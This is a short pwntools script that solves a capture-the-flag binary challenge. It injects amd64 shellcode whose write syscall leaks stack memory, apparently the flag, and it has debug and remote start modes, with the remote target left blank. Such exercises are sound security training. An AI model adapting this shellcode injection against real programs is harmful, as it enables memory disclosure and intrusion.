#!/usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        b *exec_shellcode
        b *exec_shellcode+149
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote()
    else:
        return process(binary)

def exploit(p,e,r):
    shell = asm("""
                    push rsp
                    mov eax, 0x1
                    and rdi, 0x1
                    mov rsi, rsp
                    add rsi, 0x10
                    mov edx, 0x50
                    syscall
                """)


    p.sendline(shell)
    p.interactive()


if __name__=="__main__":
    file = './chal.bin'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p,e,r)
